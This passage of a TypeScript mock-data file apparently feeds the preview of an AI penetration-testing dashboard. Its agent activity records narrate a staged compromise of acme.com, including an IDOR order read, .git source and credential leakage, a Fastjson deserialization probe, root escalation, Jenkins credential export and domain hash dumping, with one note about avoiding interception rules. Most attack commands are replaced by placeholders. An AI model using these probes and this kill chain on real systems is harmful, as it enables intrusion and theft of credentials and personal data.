    summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002",
  },
  {
    seq: 54,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-09-30T01:26:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t52",
    summary: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"555-0100", "address":"Example Street" }',
    detail: "Using authority to read other people's orders (including mobile phone number/address), no attribution verification.",
  },
  {
    seq: 55,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-09-30T01:26:28Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t53",
    summary: "report_finding(IDOR, high)",
  },
  {
    seq: 56,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-09-30T01:26:28Z"),
    kind: "tool_result",
    tool: "report_finding",
    tool_use_id: "t53",
    summary: "finding f-2 logged",
  },
  {
    seq: 57,
    worker: "work#5",
    intent_id: "i5",
    ts: T("2026-09-30T02:01:48Z"),
    kind: "thinking",
    summary: "Traversing the ID range in batches to evaluate the size of the data that can be exceeded (not exported yet to avoid triggering interception rules).",
  },

  // work#3 · i3 Backend user interface enumeration(running)
  {
    seq: 60,
    worker: "work#3",
    intent_id: "i3",
    ts: T("2026-09-30T02:00:46Z"),
    kind: "thinking",
    summary: "There is a background session, enumerate the management interface, and find the entrance that can export sensitive user data in batches (goal ②).",
  },
  {
    seq: 61,
    worker: "work#3",
    intent_id: "i3",
    ts: T("2026-09-30T02:01:15Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t61",
    summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1",
  },
  {
    seq: 62,
    worker: "work#3",
    intent_id: "i3",
    ts: T("2026-09-30T02:01:15Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t61",
    summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
    detail: "The management interface can return all users (including email/mobile phone numbers) in pages, about 12,800.",
  },
  {
    seq: 63,
    worker: "work#3",
    intent_id: "i3",
    ts: T("2026-09-30T02:01:53Z"),
    kind: "thinking",
    summary: "Confirm that there is a batch user data reading entrance; the export action hits the destructive/leakage rule, and has been submitted for interception approval and is waiting for release.",
  },

  // workG · ig .git Source code leakage and hard-coded credentials(done)
  {
    seq: 310,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-09-29T22:26:22Z"),
    kind: "thinking",
    summary: "robots.txt mentioned /.git, first detect whether the directory is downloadable, and if you can get the source code, you can find the injection point and hard-coded key in a white box.",
  },
  {
    seq: 311,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-09-29T22:26:50Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "tg1",
    summary: "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD",
  },
  {
    seq: 312,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-09-29T22:26:51Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "tg1",
    summary: "200",
    detail: "The .git directory is externally accessible.",
  },
  {
    seq: 313,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-09-29T22:27:19Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "tg2",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 314,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-09-29T22:28:16Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "tg2",
    summary: "Restore 214 files; HEAD=main. config.php/db.php are listed.",
    detail: "The complete backend source code has been restored to /tmp/acme.",
  },
  {
    seq: 315,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-09-29T22:30:10Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "tg3",
    summary: "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php",
  },
  {
    seq: 316,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-09-29T22:30:12Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "tg3",
    summary: "Recorded observation. This preview did not run it.",
    detail: "Hard-coded database password, and host points to the intranet IP - recorded as a suspected intranet common credential.",
  },
  {
    seq: 317,
    worker: "workG",
    intent_id: "ig",
    ts: T("2026-09-29T22:31:07Z"),
    kind: "result",
    summary: "Source code leakage + hard-coded DB credentials confirmation, the credentials are included in the image for subsequent intranet reuse.",
    input_tokens: 88000,
    output_tokens: 5200,
    cache_read_tokens: 60000,
    cache_write_tokens: 8000,
  },

  // work#6 · i6 shop Fingerprints and CVE Association(done)
  {
    seq: 320,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-09-29T19:32:56Z"),
    kind: "thinking",
    summary: "shop.acme.com is a self-developed e-commerce company. It first fingerprints the framework/component version, and then starts with components with known deserialization.",
  },
  {
    seq: 321,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-09-29T19:33:53Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t6a",
    summary: "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'",
  },
  {
    seq: 322,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-09-29T19:33:54Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t6a",
    summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
    detail: "Java technology stack, /api/import exists to accept JSON body.",
  },
  {
    seq: 323,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-09-29T19:36:44Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t6b",
    summary:
      'curl -s -H \'Content-Type: application/json\' -d \'{"a":{"@type":"java.lang.AutoCloseable"}}\' https://shop.acme.com/api/import',
  },
  {
    seq: 324,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-09-29T19:37:13Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t6b",
    summary: "The error stack contains com.alibaba.fastjson.JSONException (1.2.24)",
    detail: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 325,
    worker: "work#6",
    intent_id: "i6",
    ts: T("2026-09-29T19:41:30Z"),
    kind: "result",
    summary: "The fingerprint hits Fastjson 1.2.24, the deserialization RCE face is established and handed over to the intended use.",
    input_tokens: 64000,
    output_tokens: 4100,
    cache_read_tokens: 42000,
    cache_write_tokens: 6000,
  },

  // work#7 · i7 recorded the shop import issue
  {
    seq: 330,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-09-29T19:56:45Z"),
    kind: "thinking",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 331,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-09-29T19:58:11Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t7a",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 332,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-09-29T19:58:39Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t7a",
    summary: "The listener was described. This preview did not start it.",
    detail: "This preview did not run it.",
  },
  {
    seq: 333,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-09-29T20:00:34Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t7b",
    summary: "Recorded the import request. This preview did not send it.",
  },
  {
    seq: 334,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-09-29T20:01:02Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t7b",
    summary: "The stored import response was recorded. This preview did not send a payload.",
    detail: "The preview did not run it.",
  },
  {
    seq: 335,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-09-29T20:02:28Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t7c",
    summary: "The recorded session was on the DMZ host. This preview did not run a command.",
  },
  {
    seq: 336,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-09-29T20:02:29Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t7c",
    summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15",
    detail: "www-data@dmz-web01, and the second network card 10.10.10.x - has entered the DMZ and is connected to the intranet.",
  },
  {
    seq: 337,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-09-29T20:05:20Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t7d",
    summary: "report_finding(Deserialization RCE, high)",
  },
  {
    seq: 338,
    worker: "work#7",
    intent_id: "i7",
    ts: T("2026-09-29T20:10:05Z"),
    kind: "result",
    summary: "The shop import issue was recorded, and the DMZ host was reached in the notes. This preview did not run a command.",
    input_tokens: 132000,
    output_tokens: 8600,
    cache_read_tokens: 90000,
    cache_write_tokens: 12000,
  },

  // work#8 · i8 Foothold to enhance authority(done)
  {
    seq: 340,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-09-29T20:20:34Z"),
    kind: "thinking",
    summary: "www-data has limited permissions. First collect local information to find the right escalation points: sudo configuration, SUID, and kernel version.",
  },
  {
    seq: 341,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-09-29T20:22:00Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t8a",
    summary: "Recorded a local command. This preview did not run it.",
  },
  {
    seq: 342,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-09-29T20:22:02Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t8a",
    summary: "The recorded account may run a local program without a password.",
    detail: "This preview did not run it.",
  },
  {
    seq: 343,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-09-29T20:24:23Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t8b",
    summary: "Recorded a local privilege check. This preview did not run it.",
  },
  {
    seq: 344,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-09-29T20:24:24Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t8b",
    summary: "uid=0(root) gid=0(root) groups=0(root)",
    detail: "Elevated privileges to root.",
  },
  {
    seq: 345,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-09-29T20:26:17Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t8c",
    summary: "report_finding(Privilege Escalation, high)",
  },
  {
    seq: 346,
    worker: "work#8",
    intent_id: "i8",
    ts: T("2026-09-29T20:29:09Z"),
    kind: "result",
    summary: "The local root privilege escalation is completed, and the foothold is stable; prepare to use it to build an intranet for the pivot.",
    input_tokens: 74000,
    output_tokens: 4700,
    cache_read_tokens: 50000,
    cache_write_tokens: 7000,
  },

  // work#9 · i9 Intranet host discovery(done)
  {
    seq: 350,
    worker: "work#9",
    intent_id: "i9",
    ts: T("2026-09-29T22:29:13Z"),
    kind: "thinking",
    summary: "The second network was already recorded. This preview did not scan it.",
  },
  {
    seq: 351,
    worker: "work#9",
    intent_id: "i9",
    ts: T("2026-09-29T22:31:07Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t9a",
    summary: "Recorded a network check. This preview did not run it.",
  },
  {
    seq: 352,
    worker: "work#9",
    intent_id: "i9",
    ts: T("2026-09-29T22:40:11Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t9a",
    summary: "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
    detail: "Delineate domain controller DC01, file server FS01, and internal Jenkins.",
  },
  {
    seq: 353,
    worker: "work#9",
    intent_id: "i9",
    ts: T("2026-09-29T22:42:34Z"),
    kind: "result",
    summary: "Intranet host discovery is completed, and 3 high-value targets are included in the map.",
    input_tokens: 82000,
    output_tokens: 5100,
    cache_read_tokens: 56000,
    cache_write_tokens: 8000,
  },

  // work#10 · i10 Reuse of intranet credentials(running)
  {
    seq: 360,
    worker: "work#10",
    intent_id: "i10",
    ts: T("2026-09-30T01:54:06Z"),
    kind: "thinking",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 361,
    worker: "work#10",
    intent_id: "i10",
    ts: T("2026-09-30T01:55:03Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t10a",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 362,
    worker: "work#10",
    intent_id: "i10",
    ts: T("2026-09-30T01:55:08Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t10a",
    summary: "Recorded observation. This preview did not run it.",
    detail: "The sa password is successfully reused on FS01 and has administrator rights; DC01 is blocked.",
  },
  {
    seq: 363,
    worker: "work#10",
    intent_id: "i10",
    ts: T("2026-09-30T01:57:54Z"),
    kind: "thinking",
    summary: "FS01 has been captured, enumerating shared directories looking for more credentials and sensitive files...",
  },

  // work#11 · i11 Jenkins Unauthorized RCE(done)
  {
    seq: 370,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-09-29T22:57:48Z"),
    kind: "thinking",
    summary: "JENKINS 8080 is directly accessible, first check whether the /script console requires authentication.",
  },
  {
    seq: 371,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-09-29T22:59:14Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t11a",
    summary: "curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
  },
  {
    seq: 372,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-09-29T22:59:15Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t11a",
    summary: "200",
    detail: "Script Console can be accessed without logging in.",
  },
  {
    seq: 373,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-09-29T23:01:37Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t11b",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 374,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-09-29T23:01:38Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t11b",
    summary: "nt authority\\system",
    detail: "Groovy executes with SYSTEM privileges.",
  },
  {
    seq: 375,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-09-29T23:03:31Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t11c",
    summary: "curl -s -d 'script=...' http://10.10.10.20:8080/scriptText # Export Jenkins credential library",
  },
  {
    seq: 376,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-09-29T23:04:00Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t11c",
    summary: "Recorded observation. This preview did not run it.",
    detail: "Export the plain text passwords of the two domain service accounts.",
  },
  {
    seq: 377,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-09-29T23:05:26Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t11d",
    summary: "report_finding(Unauthenticated RCE, high)",
  },
  {
    seq: 378,
    worker: "work#11",
    intent_id: "i11",
    ts: T("2026-09-29T23:06:23Z"),
    kind: "result",
    summary: "Jenkins is not authorized to confirm RCE and export the credentials of two domain service accounts.",
    input_tokens: 96000,
    output_tokens: 6200,
    cache_read_tokens: 64000,
    cache_write_tokens: 9500,
  },

  // work#12 · i12 service-account secret was already recorded
  {
    seq: 380,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-09-29T23:31:09Z"),
    kind: "thinking",
    summary: "A recorded service-account secret was weak. This preview did not try to recover it.",
  },
  {
    seq: 381,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-09-29T23:34:58Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t12a",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 382,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-09-29T23:35:55Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t12a",
    summary: "A service-account ticket was recorded.",
    detail: "The ticket was already in the notes. This preview did not request another.",
  },
  {
    seq: 383,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-09-29T23:44:30Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t12b",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 384,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-09-29T23:48:19Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t12b",
    summary: "Recorded observation. This preview did not run it.",
    detail: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 385,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-09-29T23:48:47Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t12c",
    summary: "report_finding(weak service account, high)",
  },
  {
    seq: 386,
    worker: "work#12",
    intent_id: "i12",
    ts: T("2026-09-29T23:49:16Z"),
    kind: "result",
    summary: "The service-account secret was recorded as weak. This preview did not use it.",
    input_tokens: 108000,
    output_tokens: 6800,
    cache_read_tokens: 72000,
    cache_write_tokens: 10000,
  },

  // work#13 · i13 Get domain control DC01(done,Proof g4)
  {
    seq: 390,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-09-30T00:04:31Z"),
    kind: "thinking",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 391,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-09-30T00:05:56Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t13a",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 392,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-09-30T00:05:59Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t13a",
    summary: "ACME\\Administrator\nACME\\svc_deploy",
    detail: "svc_deploy is a member of Domain Admins.",
  },
  {
    seq: 393,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-09-30T00:08:19Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t13b",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 394,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-09-30T00:08:24Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t13b",
    summary: "Recorded observation. This preview did not run it.",
    detail: "Log in to domain controller DC01 as SYSTEM.",
  },
  {
    seq: 395,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-09-30T00:10:42Z"),
    kind: "tool_use",
    tool: "bash",
    tool_use_id: "t13c",
    summary: "Recorded observation. This preview did not run it.",
  },
  {
    seq: 396,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-09-30T00:13:05Z"),
    kind: "tool_result",
    tool: "bash",
    tool_use_id: "t13c",
    summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::",
    detail: "Global NTLM hash export (including krbtgt), which can make golden ticket persistent control.",
  },
  {
    seq: 397,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-09-30T00:15:28Z"),
    kind: "tool_use",
    tool: "report_finding",
    tool_use_id: "t13d",
    summary: "report_finding(Domain Compromise, high)",
  },
  {
    seq: 398,
    worker: "work#13",
    intent_id: "i13",
    ts: T("2026-09-30T00:17:51Z"),
    kind: "result",
    summary: "Recorded observation. This preview did not run it.",
    input_tokens: 144000,
    output_tokens: 9200,
    cache_read_tokens: 96000,
    cache_write_tokens: 14000,
  },

  // Lord agent(People talking in the loop)
  { seq: 70, worker: "mainagent", ts: T("2026-09-30T01:42:40Z"), kind: "user", summary: "Where to start in the background?" },
  {
    seq: 71,
    worker: "mainagent",
    ts: T("2026-09-30T01:42:42Z"),
    kind: "text",
    summary:
      "Recorded observation. This preview did not run it.",
  },
  { seq: 72, worker: "mainagent", ts: T("2026-09-30T01:58:52Z"), kind: "user", summary: "Now that we have the background, what's the next point?" },
  {
    seq: 73,
    worker: "mainagent",
    ts: T("2026-09-30T01:58:55Z"),
    kind: "text",
    summary:
      "Goal ② is to read user sensitive data: promote \"Backend User Interface Enumeration\" and \"API IDOR\" in parallel. Note that batch export will trigger interception rules and require your approval.",
  },
  {
    seq: 400,
    worker: "mainagent",
    ts: T("2026-09-29T20:11:03Z"),
    kind: "user",
    summary: "What should we verify on the recorded DMZ host?",
  },
  {
    seq: 401,
    worker: "mainagent",
    ts: T("2026-09-29T20:11:07Z"),
    kind: "text",
    summary:
      "The recorded DMZ account is limited. A local privilege change is in the notes. This preview did not run it.",
  },
  {
    seq: 402,
    worker: "mainagent",
    ts: T("2026-09-29T22:53:02Z"),
    kind: "user",
    summary: "After scanning the intranet, does the Jenkins server look unauthorized?",
  },
  {
    seq: 403,
    worker: "mainagent",
    ts: T("2026-09-29T22:53:06Z"),
    kind: "text",
    summary:
      "The stored console response did not require a sign-in. This preview did not send a new request.",
  },
  { seq: 404, worker: "mainagent", ts: T("2026-09-30T00:18:48Z"), kind: "user", summary: "DC01 won? Give a summary." },
  {
    seq: 405,
    worker: "mainagent",
    ts: T("2026-09-30T00:18:54Z"),
    kind: "text",
    summary:
      "Recorded observation. This preview did not run it.",
  },
];

export function activityForTask(): Activity[] {
  return activity;
}

// ── Token stats ──────────────────────────────────────────────────────────────
export const tokenWorkers: TokenUsage[] = [
  {
    worker: "planner",
    input_tokens: 320000,
    output_tokens: 24000,
    cache_read_tokens: 210000,
    cache_write_tokens: 33000,
  },
  {
    worker: "work#1",
    input_tokens: 288000,
    output_tokens: 21000,
    cache_read_tokens: 190000,
    cache_write_tokens: 28000,
  },
  {
    worker: "work#2",
    input_tokens: 402000,
    output_tokens: 31000,
    cache_read_tokens: 280000,
    cache_write_tokens: 41000,
  },
  {
    worker: "work#3",
    input_tokens: 274500,
    output_tokens: 20320,
    cache_read_tokens: 210400,
    cache_write_tokens: 30000,
  },
  { worker: "workG", input_tokens: 88000, output_tokens: 5200, cache_read_tokens: 60000, cache_write_tokens: 8000 },
  { worker: "work#6", input_tokens: 64000, output_tokens: 4100, cache_read_tokens: 42000, cache_write_tokens: 6000 },
  { worker: "work#7", input_tokens: 132000, output_tokens: 8600, cache_read_tokens: 90000, cache_write_tokens: 12000 },
  { worker: "work#8", input_tokens: 74000, output_tokens: 4700, cache_read_tokens: 50000, cache_write_tokens: 7000 },
  { worker: "work#9", input_tokens: 82000, output_tokens: 5100, cache_read_tokens: 56000, cache_write_tokens: 8000 },
  { worker: "work#10", input_tokens: 46000, output_tokens: 3200, cache_read_tokens: 30000, cache_write_tokens: 4500 },
  { worker: "work#11", input_tokens: 96000, output_tokens: 6200, cache_read_tokens: 64000, cache_write_tokens: 9500 },
  { worker: "work#12", input_tokens: 108000, output_tokens: 6800, cache_read_tokens: 72000, cache_write_tokens: 10000 },
  { worker: "work#13", input_tokens: 144000, output_tokens: 9200, cache_read_tokens: 96000, cache_write_tokens: 14000 },
];

// Mirrors TokenStatsBySession: completed usage is keyed by the stable UI session
// (main | plan | intent:<id>) instead of the reusable work#N executor name.
export const tokenSessions: SessionTokenUsage[] = (() => {
  const totals = new Map<string, SessionTokenUsage>();
  for (const item of activity) {
    if (item.kind !== "result") continue;
    let session = "";
    if (item.worker === "mainagent") session = "main";
    else if (item.worker === "planner") session = "plan";
    else if (item.intent_id) session = `intent:${item.intent_id}`;
    if (!session) continue;
    const current = totals.get(session) ?? {
      session,
      input_tokens: 0,
      output_tokens: 0,
      cache_read_tokens: 0,
      cache_write_tokens: 0,
    };
    current.input_tokens += item.input_tokens ?? 0;
    current.output_tokens += item.output_tokens ?? 0;
    current.cache_read_tokens += item.cache_read_tokens ?? 0;
    current.cache_write_tokens += item.cache_write_tokens ?? 0;
    totals.set(session, current);
  }
  return [...totals.values()];
})();

export const tokenTotal: TokenTotal = grandTotal;

// 400 days ending today so every dashboard range has bars. Task token objects
// are the ledger; this series only supplies the daily shape.
export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 400 }, (_, i) => {
  const d = new Date();
  d.setUTCHours(0, 0, 0, 0);
  d.setUTCDate(d.getUTCDate() - (399 - i));
  const wave = 40000 + Math.round(30000 * Math.abs(Math.sin(i / 3)));
  return {
    date: d.toISOString().slice(0, 10),
    input_tokens: wave,
    output_tokens: Math.round(wave * 0.08),
    cache_read_tokens: Math.round(wave * 0.7),
    cache_write_tokens: Math.round(wave * 0.12),
  };
});

export const convTokens: ConvTokenSummary[] = [
  {
    llm_profile_id: 1,
    created_at: T("2026-09-29T17:28:06Z"),
    input_tokens: 42000,
    output_tokens: 3800,
    cache_read_tokens: 26000,
    cache_write_tokens: 5200,
  },
  {
    llm_profile_id: 2,
    created_at: T("2026-09-29T08:53:31Z"),
    input_tokens: 18000,
    output_tokens: 1600,
    cache_read_tokens: 9000,
    cache_write_tokens: 2100,
  },
];

// ── Traffic ──────────────────────────────────────────────────────────────────
const exchanges = [
  ["x-1", "www.acme.com", "GET", "https://www.acme.com/", 200, "text/html", 48213],
  ["x-2", "www.acme.com", "GET", "https://www.acme.com/search?q=test", 200, "text/html", 5120],
  ["x-3", "www.acme.com", "GET", "https://www.acme.com/.git/HEAD", 200, "text/plain", 23],
  ["x-4", "admin.acme.com", "GET", "https://admin.acme.com/login", 200, "text/html", 12044],
  ["x-5", "admin.acme.com", "POST", "https://admin.acme.com/login", 302, "text/html", 0],
  ["x-6", "admin.acme.com", "GET", "https://admin.acme.com/dashboard", 200, "text/html", 33120],
  ["x-7", "admin.acme.com", "GET", "https://admin.acme.com/api/users?page=1", 200, "application/json", 8842],
  ["x-8", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1001", 200, "application/json", 640],
  ["x-9", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1002", 200, "application/json", 655],
  ["x-10", "api.acme.com", "GET", "https://api.acme.com/v1/users/me", 200, "application/json", 312],
  ["x-11", "api.acme.com", "GET", "https://api.acme.com/v1/admin", 401, "application/json", 45],
  ["x-12", "shop.acme.com", "GET", "https://shop.acme.com/checkout", 200, "text/html", 21990],
  ["x-13", "shop.acme.com", "POST", "https://shop.acme.com/pay", 200, "application/json", 128],
  ["x-14", "www.acme.com", "GET", "https://www.acme.com/robots.txt", 200, "text/plain", 88],
  ["x-15", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 500, "application/json", 2048],
  ["x-16", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 200, "application/json", 0],
  ["x-17", "10.10.10.20", "GET", "http://10.10.10.20:8080/script", 200, "text/html", 14200],
  ["x-18", "10.10.10.20", "POST", "http://10.10.10.20:8080/scriptText", 200, "text/plain", 86],
  ["x-19", "10.10.10.10", "POST", "https://10.10.10.10:445/directory", 200, "application/octet-stream", 0],
  ["x-n1", "www.northwind.example", "GET", "https://www.northwind.example/admin", 200, "text/html", 4096],
  ["x-n2", "mail.northwind.example", "GET", "https://mail.northwind.example/", 200, "text/plain", 180],
  ["x-n3", "www.northwind.example", "GET", "https://www.northwind.example/files/", 200, "text/html", 2400],
] as const;

export const traffic: TrafficResp = {
  enabled: true,
  proxy: ":8788",
  count: exchanges.length,
  total: exchanges.length,
  page: 0,
  size: 100,
  exchanges: exchanges.map(([id, host, method, url, status, ct, len], i) => ({
    id,
    host,
    method,
    url,
    status,
    content_type: ct,
    resp_len: len,
    ts: T(`2026-07-26T0${1 + (i % 3)}:${String(10 + i).padStart(2, "0")}:00Z`),
  })),
};

// Distinct hosts with counts, derived from the exchanges above (target picker).
const hostCounts: Record<string, number> = {};
for (const [, host] of exchanges) hostCounts[host] = (hostCounts[host] ?? 0) + 1;
export const trafficHosts: TrafficHost[] = Object.entries(hostCounts).map(([host, count]) => ({ host, count }));

function exchangePath(url: string): string {
  try {
    const parsed = new URL(url);
    return parsed.pathname + parsed.search;
  } catch {
    return "/";
  }
}

export const trafficBodies: Record<string, { req: string; resp: string }> = Object.fromEntries(
  (traffic.exchanges ?? []).map((exchange) => {
    const path = exchangePath(exchange.url);
    return [
      exchange.id,
      {
        req: `${exchange.method} ${path} HTTP/1.1\nHost: ${exchange.host}\n`,
        resp: `HTTP/1.1 ${exchange.status} \nContent-Type: ${exchange.content_type}\n\n`,
      },
    ];
  }),
);

export const findingTrafficSeeds: Record<string, { traffic_id: string; role: TrafficEvidenceRole; note: string }[]> = {
  "f-1": [{ traffic_id: "x-2", role: "proof", note: "Recorded search request. This preview did not send a new request." }],
  "f-2": [
    { traffic_id: "x-8", role: "baseline", note: "Recorded order request for the caller's own id." },
    { traffic_id: "x-9", role: "proof", note: "Recorded order request for a different id. This preview did not send a new request." },
  ],
  "f-3": [{ traffic_id: "x-11", role: "proof", note: "Recorded request to the admin API. This preview did not send a new request." }],
  "f-4": [{ traffic_id: "x-2", role: "proof", note: "Recorded search request. This preview did not send a new request." }],
  "f-5": [{ traffic_id: "x-3", role: "proof", note: "Recorded request for the exposed path. This preview did not send a new request." }],
  "f-6": [{ traffic_id: "x-5", role: "proof", note: "Recorded sign-in request. This preview did not send a new request." }],
  "f-7": [{ traffic_id: "x-4", role: "proof", note: "Recorded sign-in page request. This preview did not send a new request." }],
  "f-8": [{ traffic_id: "x-4", role: "proof", note: "Recorded sign-in page request. This preview did not send a new request." }],
  "f-9": [{ traffic_id: "x-10", role: "proof", note: "Recorded profile request. This preview did not send a new request." }],
  "f-10": [{ traffic_id: "x-12", role: "proof", note: "Recorded checkout request. This preview did not send a new request." }],
  "f-11": [{ traffic_id: "x-7", role: "proof", note: "Recorded user-list request. This preview did not send a new request." }],
  "f-12": [
    { traffic_id: "x-15", role: "proof", note: "Recorded import request. This preview did not send a new request." },
    { traffic_id: "x-16", role: "verification", note: "A second recorded import request. This preview did not send a new request." },
  ],
  "f-13": [{ traffic_id: "x-17", role: "proof", note: "Recorded request to the internal console. This preview did not send a new request." }],
  "f-14": [{ traffic_id: "x-17", role: "proof", note: "Recorded request from the internal host. This preview did not send a new request." }],
  "f-15": [
    { traffic_id: "x-17", role: "baseline", note: "Recorded request to the internal console." },
    { traffic_id: "x-18", role: "proof", note: "Recorded follow-up to the internal console. This preview did not send a new request." },
  ],
